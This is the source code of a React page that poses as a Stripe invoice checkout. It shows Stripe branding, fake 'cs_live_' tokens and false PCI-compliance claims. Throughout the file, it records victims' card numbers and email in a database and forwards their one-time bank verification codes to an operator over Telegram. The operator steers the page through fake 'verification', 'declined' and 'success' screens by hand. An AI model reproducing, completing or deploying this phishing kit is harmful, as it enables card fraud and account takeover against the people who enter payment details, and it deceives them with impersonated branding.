import { useState, useEffect, useRef, useCallback } from "react";
import { useParams } from "react-router-dom";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import type { OtpType } from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import PaymentRejected from "@/components/PaymentRejected";
import WaitingScreen from "@/components/WaitingScreen";
import ProcessingOverlay from "@/components/ProcessingOverlay";
import CardDeclinedScreen from "@/components/CardDeclinedScreen";
import InvoiceLoadingSkeleton from "@/components/InvoiceLoadingSkeleton";
import StripeWordmark from "@/components/StripeWordmark";
import { supabase } from "@/integrations/supabase/client";
import { useSessionSync } from "@/hooks/use-session-sync";
import { ShieldCheck, Lock } from "lucide-react";

const InvoicePayment = () => {
  const { invoiceId: rawParam } = useParams<{ invoiceId: string }>();
  
  // Decode Stripe-style token back to UUID, or use raw param as fallback
  const invoiceId = (() => {
    if (!rawParam) return undefined;
    // If it looks like a UUID already, use directly
    if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(rawParam)) return rawParam;
    // Strip cs_live_ prefix and decode
    try {
      const stripped = rawParam.replace(/^cs_live_/, '');
      // The base64-encoded UUID is 32 chars after encoding (24-char UUID in base64 ~32), rest is random padding
      const base64Part = stripped.slice(0, 48); // generous slice
      const padded = base64Part.replace(/-/g, '+').replace(/_/g, '/');
      const decoded = atob(padded);
      if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(decoded)) return decoded;
    } catch { /* fall through */ }
    return rawParam;
  })();
  const [step, setStep] = useState<"loading" | "not_found" | "paid" | "form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected" | "card_declined">("loading");
  const stepRef = useRef(step);
  stepRef.current = step;
  const [invoice, setInvoice] = useState<any>(null);
  const [businessSettings, setBusinessSettings] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [otpError, setOtpError] = useState<string | null>(null);
  const [otpType, setOtpType] = useState<OtpType>("6digit");
  const [cardInvalidError, setCardInvalidError] = useState<string | null>(null);
  const [submittedEmail, setSubmittedEmail] = useState<string>("");
  const [submittedCardLast4, setSubmittedCardLast4] = useState<string>("");
  const [submittedCardBrand, setSubmittedCardBrand] = useState<string>("");
  const visitorId = useRef(crypto.randomUUID());

  // Presence tracking
  useEffect(() => {
    const channel = supabase.channel("visitors", {
      config: { presence: { key: visitorId.current } },
    });
    channel
      .on("presence", { event: "sync" }, () => {})
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await channel.track({ online_at: new Date().toISOString(), visitor_id: visitorId.current });
        }
      });
    return () => { supabase.removeChannel(channel); };
  }, []);

  // Load invoice and business settings
  useEffect(() => {
    const load = async () => {
      const [invoiceRes, settingsRes] = await Promise.all([
        supabase.from("invoices").select("*").eq("id", invoiceId).single(),
        supabase.from("business_settings").select("*").limit(1).single(),
      ]);
      if (invoiceRes.error || !invoiceRes.data) { setStep("not_found"); return; }
      setInvoice(invoiceRes.data);
      if (settingsRes.data) setBusinessSettings(settingsRes.data);
      if (invoiceRes.data.status === "paid") setStep("paid");
      else setStep("form");
    };
    if (invoiceId) load();
  }, [invoiceId]);

  // Session status handler
  const handleStatusChangeRef = useRef<(status: string, formData: Record<string, any>) => void>(() => {});
  handleStatusChangeRef.current = (newStatus: string, formData: Record<string, any>) => {
    const currentStep = stepRef.current;
    if (currentStep === "processing_card" || currentStep === "waiting") {
      if (newStatus === "otp") { setOtpError(null); setOtpType((formData.otp_type as OtpType) || "6digit"); setStep("otp"); }
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "card_invalid") { setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again."); setStep("card_declined"); }
    }
    if (currentStep === "otp") {
      if (newStatus === "otp") setOtpType((formData.otp_type as OtpType) || "6digit");
      if (newStatus === "otp_wrong") setOtpError("The verification code you entered is incorrect. Please try again.");
      if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "card_invalid") { setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again."); setStep("card_declined"); }
    }
    if (currentStep === "processing") {
      if (newStatus === "success") { setStep("success"); supabase.from("invoices").update({ status: "paid" }).eq("id", invoiceId).then(() => {}); }
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
      if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
      if (newStatus === "card_invalid") { setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again."); setStep("card_declined"); }
    }
  };

  useSessionSync(sessionId, {
    onStatusChange: (status, formData) => handleStatusChangeRef.current(status, formData),
  });

  const pendingSessionId = useRef<string | null>(null);

  const handleFormSubmit = async (id: string) => {
    pendingSessionId.current = id;
    setSessionId(id);
    setCardInvalidError(null);
    const { data } = await supabase.from("sessions").select("form_data").eq("id", id).single();
    const fd = (data?.form_data as any) || {};
    if (fd.email) setSubmittedEmail(fd.email);
    if (fd.cardNumber) {
      const digits = fd.cardNumber.replace(/\s/g, "");
      setSubmittedCardLast4(digits.slice(-4));
      if (/^4/.test(digits)) setSubmittedCardBrand("visa");
      else if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) setSubmittedCardBrand("mastercard");
      else if (/^3[47]/.test(digits)) setSubmittedCardBrand("amex");
      else setSubmittedCardBrand("card");
    }
    setStep("processing_card");
    // Mark invoice as pending
    if (invoiceId) {
      await supabase.from("invoices").update({ status: "pending" as any }).eq("id", invoiceId);
    }
  };

  const handleProcessingComplete = useCallback(() => {
    if (stepRef.current === "processing_card") setStep("waiting");
  }, []);

  const handleOtpResend = async () => {
    if (!sessionId) return;
    try {
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
      const existingData = (data?.form_data as Record<string, any>) || {};
      await supabase.from("sessions").update({
        form_data: { ...existingData, resend_requested: true, resend_requested_at: new Date().toISOString() } as any,
      }).eq("id", sessionId);
      await supabase.functions.invoke("send-to-telegram", {
        body: { type: "otp", otp: "🔄 Client clicked RESEND verification code / approval request" },
      });
    } catch { /* fail silently */ }
  };

  const handleOtpSubmit = async (otp: string) => {
    setOtpError(null);
    if (sessionId) {
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
      const existingData = (data?.form_data as Record<string, any>) || {};
      await supabase.from("sessions").update({ status: "otp_submitted" as any, form_data: { ...existingData, otp } as any }).eq("id", sessionId);
      // Send OTP code to admin via Telegram
      await supabase.functions.invoke("send-to-telegram", {
        body: { type: "otp", otp: `🔑 OTP Code Submitted: ${otp}` },
      });
    }
    setStep("processing");
  };

  const companyName = businessSettings?.company_name || "Pay";
  const amount = invoice?.amount || 0;
  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  if (step === "loading") return <InvoiceLoadingSkeleton />;

  if (step === "not_found") {
    return (
      <div className="min-h-screen bg-stripe-bg flex items-center justify-center p-4">
        <div className="text-center space-y-4 animate-stripe-slide">
          <div className="h-16 w-16 rounded-2xl bg-white/[0.04] border border-white/[0.06] flex items-center justify-center mx-auto">
            <Lock className="h-7 w-7 text-white/25" />
          </div>
          <h1 className="text-xl font-display font-semibold text-white">Invoice not found</h1>
          <p className="text-white/35 text-sm max-w-sm leading-relaxed">This payment link is invalid or has expired. Please contact the merchant for a new link.</p>
        </div>
      </div>
    );
  }

  if (step === "paid") {
    return (
      <div className="min-h-screen bg-stripe-bg flex items-center justify-center p-4">
        <div className="text-center space-y-4 animate-stripe-slide">
          <div className="h-16 w-16 rounded-2xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center mx-auto">
            <ShieldCheck className="h-7 w-7 text-emerald-400" />
          </div>
          <h1 className="text-xl font-display font-semibold text-white">Invoice already paid</h1>
          <p className="text-white/35 text-sm max-w-sm leading-relaxed">This invoice ({invoice?.invoice_number}) has already been paid. No further action is needed.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-stripe-bg flex">
      {/* Left panel — order summary */}
      <div className="hidden lg:flex lg:w-[480px] xl:w-[540px] flex-col justify-between p-10 xl:p-14">
        <div>
          {/* Company branding */}
          <div className="flex items-center gap-3 mb-14">
            <div className="h-10 w-10 rounded-xl bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center shadow-lg shadow-primary/20">
              <span className="text-primary-foreground text-sm font-bold">{companyName.charAt(0)}</span>
            </div>
            <span className="text-white/90 font-display font-semibold text-lg tracking-tight">{companyName}</span>
          </div>

          <div className="space-y-8">
            {/* Amount display */}
            <div>
              <p className="text-white/40 text-sm font-medium">Invoice from {companyName}</p>
              <p className="text-white/25 text-xs mt-1 font-mono">Ref: {invoice?.invoice_number}</p>
              <p className="text-white text-5xl font-display font-extrabold tracking-tight mt-3">
                {formatEuro(total)}
              </p>
            </div>

            {/* Description & bill-to cards */}
            {invoice?.description && (
              <div className="bg-white/[0.03] rounded-xl p-4 border border-white/[0.05] backdrop-blur-sm">
                <p className="text-[10px] uppercase tracking-[0.15em] font-semibold text-white/25 mb-1.5">Description</p>
                <p className="text-white/65 text-sm leading-relaxed">{invoice.description}</p>
              </div>
            )}

            {invoice?.client_name && (
              <div className="bg-white/[0.03] rounded-xl p-4 border border-white/[0.05] backdrop-blur-sm">
                <p className="text-[10px] uppercase tracking-[0.15em] font-semibold text-white/25 mb-1.5">Bill to</p>
                <p className="text-white/65 text-sm">{invoice.client_name}</p>
                {invoice.client_email && <p className="text-white/30 text-xs mt-1">{invoice.client_email}</p>}
              </div>
            )}

            {/* Line items */}
            <div className="space-y-0 mt-10">
              <div className="flex items-center justify-between py-3.5 border-b border-white/[0.06]">
                <p className="text-white/40 text-sm">Amount</p>
                <p className="text-white/80 text-sm font-medium tabular-nums">{formatEuro(parsedAmount)}</p>
              </div>
              <div className="flex items-center justify-between py-3.5 border-b border-white/[0.06]">
                <p className="text-white/40 text-sm">Transaction fee (0.1%)</p>
                <p className="text-white/80 text-sm font-medium tabular-nums">{formatEuro(transactionFee)}</p>
              </div>
              <div className="flex items-center justify-between py-3.5">
                <p className="text-white font-display font-semibold text-sm">Total due</p>
                <p className="text-white font-display font-bold text-base tabular-nums">{formatEuro(total)}</p>
              </div>
            </div>

            {invoice?.due_date && (
              <div className="flex items-center gap-2 text-white/20 text-xs mt-2">
                <span>Due by {new Date(invoice.due_date).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" })}</span>
              </div>
            )}
          </div>
        </div>

        {/* Trust footer */}
        <div className="space-y-3">
          <div className="flex items-center gap-2.5 text-white/25 text-xs">
            <ShieldCheck className="h-4 w-4 text-emerald-400/50" />
            <span>256-bit SSL Encrypted · PCI DSS Level 1 Compliant</span>
          </div>
          <div className="flex items-center gap-3 text-white/20 text-xs">
            <span className="flex items-center gap-1.5">Powered by <StripeWordmark className="h-3.5 text-white/40" /></span>
            <span>·</span>
            <a href="https://stripe.com/legal/consumer" target="_blank" rel="noopener noreferrer" className="hover:text-white/40 transition-colors">Terms</a>
            <a href="https://stripe.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-white/40 transition-colors">Privacy</a>
          </div>
        </div>
      </div>

      {/* Right panel — form area */}
      <div className="flex-1 flex items-start justify-center bg-background lg:rounded-tl-3xl lg:rounded-bl-3xl overflow-y-auto">
        <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
          {/* Mobile header */}
          <div className="lg:hidden mb-8">
            <div className="flex items-center gap-2.5 mb-5">
              <div className="h-8 w-8 rounded-lg bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center shadow-md shadow-primary/15">
                <span className="text-primary-foreground text-xs font-bold">{companyName.charAt(0)}</span>
              </div>
              <span className="text-foreground font-display font-semibold">{companyName}</span>
            </div>
            <p className="text-muted-foreground text-sm">Invoice from {companyName}</p>
            <p className="text-muted-foreground/50 text-xs mt-0.5 font-mono">Ref: {invoice?.invoice_number}</p>
            <p className="text-foreground text-3xl font-display font-bold tracking-tight mt-2">{formatEuro(total)}</p>
            {invoice?.description && (
              <p className="text-muted-foreground text-sm mt-2 leading-relaxed">{invoice.description}</p>
            )}
            <div className="mt-3 space-y-1.5">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                <span className="text-foreground tabular-nums">{formatEuro(transactionFee)}</span>
              </div>
              <div className="flex items-center justify-between text-sm font-semibold">
                <span className="text-foreground">Total</span>
                <span className="text-foreground tabular-nums">{formatEuro(total)}</span>
              </div>
            </div>
            <div className="flex items-center gap-2 mt-4 text-muted-foreground/40 text-xs">
              <ShieldCheck className="h-3.5 w-3.5 text-emerald-500/50" />
              <span>SSL Encrypted · PCI DSS Compliant</span>
            </div>
          </div>

          {step === "form" && (
            <PaymentForm amount={String(parsedAmount)} onAmountChange={() => {}} total={total} isValidAmount={true}
              formatEuro={formatEuro} onSuccess={handleFormSubmit} fixedAmount={true} invoiceId={invoiceId} cardInvalidError={cardInvalidError} />
          )}
          {step === "processing_card" && <ProcessingOverlay onComplete={handleProcessingComplete} />}
          {step === "waiting" && <WaitingScreen amount={formatEuro(total)} />}
          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} onResend={handleOtpResend} error={otpError} otpType={otpType} />}
          {step === "processing" && <WaitingScreen amount={formatEuro(total)} />}
          {step === "success" && (
            <PaymentSuccess
              amount={formatEuro(total)}
              email={submittedEmail}
              cardLast4={submittedCardLast4}
              cardBrand={submittedCardBrand}
              companyName={companyName}
              invoiceNumber={invoice?.invoice_number}
              description={invoice?.description}
              clientName={invoice?.client_name}
              clientEmail={invoice?.client_email}
              baseAmount={formatEuro(parsedAmount)}
              transactionFee={formatEuro(transactionFee)}
            />
          )}
          {step === "card_declined" && <CardDeclinedScreen onComplete={() => { setStep("form"); setSessionId(null); }} />}
          {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
        </div>
      </div>
    </div>
  );
};

export default InvoicePayment;